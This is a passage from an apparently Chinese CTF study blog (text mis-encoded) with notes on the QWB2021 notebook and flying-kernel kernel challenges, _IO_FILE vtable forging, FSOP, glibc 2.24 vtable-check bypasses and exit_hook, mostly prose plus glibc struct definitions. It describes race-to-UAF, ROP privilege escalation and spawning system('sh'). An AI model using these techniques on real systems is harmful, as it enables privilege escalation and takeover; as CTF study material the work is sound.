class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;signal.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br></code></pre></div></td></tr></table></figure></blockquote><blockquote><p><em><strong>uffdio_copyæ€ä¹ˆç”¨?</strong></em> </p><p>å…ˆmmapä¸€ä¸ªchunk, ç„¶åä½¿ç”¨UFFDIO_COPY+ioctlæ“ä½œäº¤ç»™å†…æ ¸å®Œæˆcopyæ“ä½œ. ä¸æ˜¯å¾ˆæ˜ç™½ä¸ºä»€ä¹ˆæ˜¯copy, å¦‚æœåªä¸ºäº†å…¨0page, é‚£è¿˜è¦å¼„ä¸€ä¸ª4kbçš„é¡µé¢, ä¸è¿‡copyçš„åŒæ—¶å¯èƒ½ä¹Ÿåœ¨å‘ç”Ÿé¡µé”™è¯¯çš„åœ°æ–¹è‡ªåŠ¨åˆ†é…äº†ç›¸åº”ç©ºé—´, ä¹Ÿå¯ä»¥è¯´æ˜¯å¯ä»¥ä¸¤ç”¨å§.<a href="https://zhuanlan.zhihu.com/p/385645268">https://zhuanlan.zhihu.com/p/385645268</a></p></blockquote><h4 id="QWB2021-notebook"><a href="#QWB2021-notebook" class="headerlink" title="QWB2021-notebook"></a>QWB2021-notebook</h4><blockquote><p>åœ¨run.shä¸­çœ‹åˆ°ä¸€è¡Œ<code>exec timeout 300Â qemu-....</code>, ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªæ˜¯bashçš„built-in commands, åˆ†åˆ«æ˜¯æ›¿æ¢å½“å‰shellä¸ºå¦ä¸€ä¸ªç¨‹åº, ä»¥åŠè®¾ç½®å‘½ä»¤è¿è¡Œæ—¶é—´. è¿‡äºéº»çƒ¦, ç›´æ¥æ¢æˆæ‰§è¡Œqemu.</p><p>å…³äºkptr_restrict(<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>): the <code>%pK</code> printk format specifier can be used to print out kernel pointer, and the /proc/sys/kernel/kptr_restrict sysctl can disable this behavior.</p><p>å…³äºrun.shä¸­qemuçš„-appendå†…æ ¸å¯åŠ¨é€‰é¡¹loglevel=3: ç›´æ¥åˆ æ‰, å¯åŠ¨çš„æ—¶å€™å°±ä¼šprintå‡ºkernel ring buffer.</p><p>æ€€ç–‘<code>__fentry__</code>å°±æ˜¯ä¸€ä¸ªfunction tracer.</p><p>é‡åˆ°ä¸€äº›å†…æ ¸å‡½æ•°, å…·ä½“å¯ä»¥åˆ°ç½‘ç«™æŸ¥æ‰¾. æ¯”å¦‚<a href="https://elixir.bootlin.com/linux/v5.4/source/mm/usercopy.c#L256"><code>check_object_size()</code></a> </p></blockquote><p>ä¿æŠ¤æƒ…å†µ: kaslr, smep, smap, 2 cores and 2 threads loglevel=3 + dmesg(å·²å…³, å®é™…ä¸å¯ç”¨) kptr</p><blockquote><p>å¯åŠ¨çš„æ—¶å€™è€—æ—¶17ç§’, ç»“æœæŸ¥äº†åŠå¤©å‘ç°æ˜¯<code>init</code>é‡Œé¢ä¸€è¡Œ<code>ifup eth0 &gt; /dev/null 2&gt;/dev/null</code>å¯¼è‡´ç³»ç»Ÿhang up. ä¸çŸ¥é“è¿™æ¸…ç©ºstdoutå’Œstderrçš„æ„ä¹‰æ˜¯ä½•åœ¨, ä»–çš„è¾“å‡ºå¦‚ä¸‹:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ifup eth0</span>                                                 <br>Waiting for interface eth0 to appear............... timeout!  <br>run-parts: /etc/network/if-pre-up.d/wait_iface: exit status 1 <br></code></pre></div></td></tr></table></figure><p>å°±åœ¨è¿™å„¿ç¡¬ç­‰. linuxç½‘ç»œè®¾ç½®ä¸å¤ªæ‡‚, å…ˆä¸ç®¡äº†.</p></blockquote><p>åœ¨initä¸­åˆå§‹åŒ–äº†ä¸€ä¸ªè¯»å†™é”. å¯èƒ½æœ‰ç‚¹ç”¨å¤„.</p><p>è¿˜æœ‰ä¸€ä¸ªnoteç»“æ„ä½“æ•°ç»„notebook, ç”±ä¸€ä¸ªæŒ‡å‘å†…å®¹çš„æŒ‡é’ˆå’Œå¤§å°ä¸¤ä¸ªå˜é‡ç»„æˆ, æ¯ä¸ªå››å­—. æœ‰16ä¸ª, å¹¶ä¸”æœ‰æ£€æŸ¥è¶Šç•Œ.</p><ul><li>read: è¯»å–sizeå­—èŠ‚, ä¼šæ£€æŸ¥noteåœ°å€çœŸå®æ€§ heapæˆ–stackå—å®Œæ•´æ€§ æ˜¯å¦åœ¨kernel text areaé‡Œ</li><li>write: å†™å…¥sizeå­—èŠ‚, æ£€æŸ¥åŒä¸Š.</li><li>ioctl: å‚æ•°ä¸º3ä¸ªsize_tç±»å‹çš„ç»“æ„ä½“. åˆ†åˆ«æ˜¯<code>idx, size, buf</code>.<ul><li>0x100: note_add sizeå°äº0x60, å¤åˆ¶bufåˆ°name(??), noteä¸ºNULLåˆ™é‡æ–°kmalloc, æœ‰<strong>è¯»è€…é”</strong>.</li><li>0x64: note_gift å¤åˆ¶æ•´ä¸ªnotebook(0x100bytes)åˆ°bufä¸­</li><li>0x200: note_del é‡Šæ”¾note + å¦‚æœsizeä¸º0åˆ™æ¸…ç©ºç»“æ„ä½“, <strong>å†™è€…é”</strong>.</li><li>0x300: note_edit è°ƒæ•´noteç©ºé—´å¤§å°, <strong>è¯»è€…é”</strong>.<ul><li>sizeæ²¡å˜åŒ–, é€€å‡º. </li><li>å¦‚æœsizeä¸º0åˆ™è®¤ä¸ºæ˜¯å·²ç»free, é€€å‡º. </li><li>ç°åœ¨ä½¿ç”¨<code>realloc</code>ä¸€å—chunk, èµ‹å€¼ç»™note, ç„¶åunlockè¯»è€…é”.</li></ul></li></ul></li></ul><p>æä¾›äº†notebookå†…æ ¸æ¨¡å—çš„åŸºå€. åœ¨<code>/tmp/moduleaddr</code>é‡Œ. </p><p>ä¸¤ä¸ªæœ‰è¯»è€…é”çš„å‡½æ•°éƒ½æ²¡æœ‰æ£€æŸ¥size, å› æ­¤å¯ä»¥ç­‰äº0. </p><p>æ‰€ä»¥æ–¹æ³•æ˜¯: </p><ul><li>å…ˆaddä¸€ä¸ª, ç„¶ååœ¨editä¸­æ‰§è¡Œå®Œkreallocåå¡ä½, å¹¶ä¸”newsizeä¸º0, ä¹Ÿå°±æ˜¯ç›´æ¥é‡Šæ”¾è¿™ä¸€å—, ç„¶ååœ¨addä¸­ä¿®æ”¹sizeä¸º0x60åå¡ä½, è¿™æ ·å°±èƒ½UAFä¸€ä¸ªä»»æ„å¤§å°çš„å—(è¦å…ˆé€šè¿‡addå†editä¸€ä¸ªå¤§chunk, è¿™æ ·æ‰èƒ½ç»§ç»­è¿›è¡Œä¸Šé¢çš„æ“ä½œ), ä¸è¿‡åªèƒ½æ“çºµå‰0x60ä¸ªå­—èŠ‚. </li></ul><p>UAFä¹‹åå¯ä»¥ä½¿ç”¨ä¹‹å‰ä»‹ç»è¿‡çš„tty_structæ–¹æ³•æ¥æ„é€ ROPææƒ, è¿”å›ç”¨æˆ·æ€æ‰§è¡Œshell. </p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•, work_for_cpuå‡½æ•°, æ€»ç»“: çœ‹éº»äº†.</p><h2 id="flying-kernel-1"><a href="#flying-kernel-1" class="headerlink" title="flying-kernel"></a>flying-kernel</h2><ul><li>printkä¸­ä½¿ç”¨çš„KERN_INFOæ˜¯ä¸€ä¸ªåªå‡½æ•°å­—çš„å­—ç¬¦ä¸², å’Œè¦æ‰“å°çš„å­—ç¬¦ä¸²ç”¨ç©ºæ ¼è¿ç®—ç¬¦æ‹¼æ¥åœ¨ä¸€èµ·, æ‰€ä»¥åœ¨IDAä¸­ä¼šçœ‹åˆ°ä»¥æ•°å­—(è¿˜æœ‰ä¸€ä¸ªheader:<code>\001</code>)å¼€å¤´çš„string, å†…æ ¸ç”¨è¿™ä¸ªæ¥åˆ¤æ–­log_level.</li><li>å·®ç‚¹å¿˜äº†è¿™æ˜¯åœ¨containeré‡Œé¢è¿è¡Œqemu.</li><li>è‡³äºé‚£äº›ç½‘ç»œé…ç½®æ–‡ä»¶åº”è¯¥æ˜¯è¿œç¨‹éƒ¨ç½²ç¯å¢ƒäº†, æˆ‘åº”è¯¥ä¸ç”¨åœ¨æ„. </li><li><strong>å¦‚æœæˆ‘åœ¨æœ¬åœ°è¿è¡Œå¥½åƒä¹Ÿä¸ç”¨docker.</strong>â€¦..</li></ul><hr><p>åœ¨è‡ªå®šä¹‰çš„ioctlå‡½æ•°ä¸­ï¼Œè®¾ç½®äº†å‚æ•°2ä¸ºcommandï¼Œæœ‰ä¸‰ç§æƒ…å†µï¼š</p><ul><li>command = 0x5555æ—¶ï¼šè°ƒç”¨kmallocå‡½æ•°ç”³è¯·ä¸€ä¸ª0x80çš„chunk</li><li>command = 0x6666æ—¶ï¼šfree chunkä½†æŒ‡é’ˆæ²¡æ¸…ç©º</li><li>command = 0x7777æ—¶ï¼šè°ƒç”¨printkè¾“å‡ºï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li></ul><p>ä¸€å…±ä¸¤ä¸ªæ¼æ´ç‚¹ï¼š0x80çš„UAFï¼Œå’Œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>è¿™ä¸€é¢˜æ²¡æœ‰åˆ©ç”¨tty, è€Œæ˜¯å¦å¤–ä¸€ä¸ªç»“æ„ä½“. work_for_cpu. </p><p><a href="https://www.anquanke.com/post/id/264563">å‡ºé¢˜æ€»ç»“</a> </p><h2 id="IO-FILE-Exploitation"><a href="#IO-FILE-Exploitation" class="headerlink" title="_IO_FILE Exploitation"></a>_IO_FILE Exploitation</h2><p>å…·ä½“è§<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/">Wiki</a>. ;</p><p>_IO_FILEçš„ç»“æ„ä½“:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The tag name of this struct is _IO_FILE to preserve historic</span><br><span class="hljs-comment">   C++ mangled names for functions taking FILE* arguments.</span><br><span class="hljs-comment">   That name should not be used in new code.  */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">int</span> _flags;                <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-keyword">char</span> *_IO_read_ptr;        <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">char</span> *_IO_read_end;        <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_read_base;        <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_write_base;        <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_write_ptr;        <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">char</span> *_IO_write_end;        <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_buf_base;        <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_buf_end;        <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br>  <span class="hljs-keyword">int</span> _fileno;<br>  <span class="hljs-keyword">int</span> _flags2;<br>  <span class="hljs-keyword">__off_t</span> _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> _cur_column;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">char</span> _vtable_offset;<br>  <span class="hljs-keyword">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>  _IO_lock_t *_lock;<br><span class="hljs-comment">//#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="hljs-comment">//&#125;;</span><br><span class="hljs-comment">//struct _IO_FILE_complete</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//  struct _IO_FILE _file;</span><br><span class="hljs-comment">//#endif</span><br>  <span class="hljs-keyword">__off64_t</span> _offset;<br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-keyword">void</span> *_freeres_buf;<br>  <span class="hljs-keyword">size_t</span> __pad5;<br>  <span class="hljs-keyword">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-keyword">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">size_t</span>)];<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>vtable, çœ‹æ³¨é‡Š:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>_IO_jump_tå†…å®¹, å·²ç»å…¨éƒ¨å®šä¹‰:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>tips:</p><ul><li><p>åœ¨<code>_IO_file_init</code> å‡½æ•°çš„åˆå§‹åŒ–æ“ä½œä¸­ï¼Œä¼šè°ƒç”¨<code>_IO_link_in</code> æŠŠæ–°åˆ†é…çš„ FILE é“¾å…¥<code>_IO_list_all</code> ä¸ºèµ·å§‹çš„ FILE é“¾è¡¨ä¸­</p></li><li><p>â€˜<strong>overflow</strong>â€˜ hook flushes the buffer.  (<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_M/WJUMP3">functions in vtable</a>) </p></li></ul><h3 id="ä¼ªé€ vtable"><a href="#ä¼ªé€ vtable" class="headerlink" title="ä¼ªé€ vtable"></a>ä¼ªé€ vtable</h3><p>é¦–å…ˆåˆ†é…ä¸€å—å†…å­˜æ¥å­˜æ”¾ä¼ªé€ çš„ vtableï¼Œä¹‹åä¿®æ”¹<code>_IO_FILE_plus</code> çš„ vtable æŒ‡é’ˆæŒ‡å‘è¿™å—å†…å­˜. å› ä¸º vtable ä¸­å‡½æ•°è°ƒç”¨æ—¶ä¼šæŠŠå¯¹åº”çš„<code>_IO_FILE_plus</code> æŒ‡é’ˆä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬æŠŠ â€œshâ€ å†™å…¥<code>_IO_FILE_plus</code> å¤´éƒ¨ã€‚ä¹‹åå¯¹ fwrite çš„è°ƒç”¨å°±ä¼šç»è¿‡æˆ‘ä»¬ä¼ªé€ çš„ vtable æ‰§è¡Œ system(â€œshâ€)ã€‚</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ<code>_IO_list_all</code> çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„<code>_IO_FILE</code> é¡¹ï¼Œä½†æ˜¯å•çº¯çš„ä¼ªé€ åªæ˜¯æ„é€ äº†æ•°æ®è¿˜éœ€è¦æŸç§æ–¹æ³•è¿›è¡Œè§¦å‘ã€‚FSOP é€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨<code>_IO_flush_all_lockp</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°<code>_IO_list_all</code> é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª FILE è°ƒç”¨ fflushï¼Œä¹Ÿå¯¹åº”ç€ä¼šè°ƒç”¨<code>_IO_FILE_plus.vtable </code>ä¸­çš„<code>_IO_overflow</code>ã€‚</p><blockquote><p><em>fflush</em>() forces a <strong>write</strong> of all user-space buffered data for the given output or update stream</p></blockquote><p>a good <a href="https://gsec.hitb.org/materials/sg2018/D1%20-%20FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">material</a> in a conference</p><h3 id="glibc-gt-2-24"><a href="#glibc-gt-2-24" class="headerlink" title="glibc&gt;2.24"></a>glibc&gt;2.24</h3><p>2.24åŠ å…¥äº†å¯¹vtableåŠ«æŒçš„æ£€æŸ¥.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br></code></pre></div></td></tr></table></figure><p>ä¸¤ä¸ªextern variableå®šä¹‰äº†vtableçš„åœ°å€èŒƒå›´, åœ¨<code>IO_validate_vtable</code>ä¸­è®¡ç®—vtableçš„åœ°å€æ˜¯å¦è½åœ¨è¿™ä¸ªèŒƒå›´ä¹‹å†…. ç»è¿‡gdb(æºç æŸ¥ä¸åˆ°), è¿™ä¸¤ä¸ªåƒæ˜¯asmé‡Œé¢çš„æ ‡ç­¾ä¸€æ ·, ä¸æ˜¯ä¸€ä¸ªå˜é‡ä¼°è®¡æ²¡æ³•ä¿®æ”¹, é™¤éèƒ½åœ¨libcä¸­çš„dataæ®µè¿›è¡Œä¿®æ”¹, ä¸ç„¶æ— æ³•åŠ«æŒ. </p><p>æ–°çš„æ–¹æ³•æœ‰ä¸¤ç§:</p><ul><li>ä¿®æ”¹<code>_IO_buf_base</code>åˆ°æŒ‡å®šçš„ä½ç½®å°±å¯ä»¥ä»»æ„åœ°å€å†™.</li><li><code>libc</code>ä¸­ä¸ä»…ä»…åªæœ‰<code>_IO_file_jumps</code>è¿™ä¹ˆä¸€ä¸ª<code>vtable</code>ï¼Œè¿˜æœ‰ä¸€ä¸ªå«<code>_IO_str_jumps</code>çš„ ï¼Œè¿™ä¸ª <code>vtable</code> ä¸åœ¨ check èŒƒå›´ä¹‹å†…ã€‚<br>å‰©ä¸‹æµç¨‹è¯¦è§<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/exploit-in-libc2.24/#_io_str_jumps-overflow">è¿™é‡Œ</a>. æœ€å¥½å…ˆçœ‹å®Œheapçš„æ‰€æœ‰åº”ç”¨. </li></ul><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><h3 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h3><p><code>exit()</code>è°ƒç”¨å…³ç³»å›¾:</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">void <span class="hljs-keyword">exit</span>()<br>    __run_exit_handlers()<br>        (some functions <span class="hljs-keyword">in</span> list)<br>        ...<br>        _dl_fini<br>            __rtld_lock_lock_recursive<br>            __rtld_lock_unlock_recursive<br>        ...<br></code></pre></div></td></tr></table></figure><h4 id="ç›¸å…³ç»“æ„ä½“"><a href="#ç›¸å…³ç»“æ„ä½“" class="headerlink" title="ç›¸å…³ç»“æ„ä½“:"></a>ç›¸å…³ç»“æ„ä½“:</h4><p><code>struct rtld_global</code> (rt means RunTime): </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Internal functions of the run-time dynamic linker.</span><br><span class="hljs-comment">These can be accessed if you link again the dynamic linker</span><br><span class="hljs-comment">as a shared library, as in `-lld&#x27; or `/lib/ld.so&#x27; explicitly;</span><br><span class="hljs-comment">but are not normally of interest to user programs.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The `-ldl&#x27; library functions in &lt;dlfcn.h&gt; provide a simple</span><br><span class="hljs-comment">user interface to run-time dynamic linking.  */</span><br></code></pre></div></td></tr></table></figure><p>exit_function and exit_function_list, åœ¨handlerä¸­éå†listæ¥æ‰§è¡Œæ¯ä¸€ä¸ªexit_function: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span><br><span class="hljs-comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> flavor;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">      &#123;</span><br>    <span class="hljs-keyword">void</span> (*at) (<span class="hljs-keyword">void</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">      &#123;</span><br>        <span class="hljs-keyword">void</span> (*fn) (<span class="hljs-keyword">int</span> status, <span class="hljs-keyword">void</span> *arg);<br>        <span class="hljs-keyword">void</span> *arg;<br>      &#125; on;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">      &#123;</span><br>        <span class="hljs-keyword">void</span> (*fn) (<span class="hljs-keyword">void</span> *arg, <span class="hljs-keyword">int</span> status);<br>        <span class="hljs-keyword">void</span> *arg;<br>        <span class="hljs-keyword">void</span> *dso_handle;<br>      &#125; cxa;<br>      &#125; func;<br>  &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function_list</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function_list</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function</span> <span class="hljs-title">fns</span>[32];</span><br>  &#125;;<br></code></pre></div></td></tr></table></figure><p><code>__rtld_lock_lock_recursive</code> and <code>__rtld_lock_unlock_recursive</code> 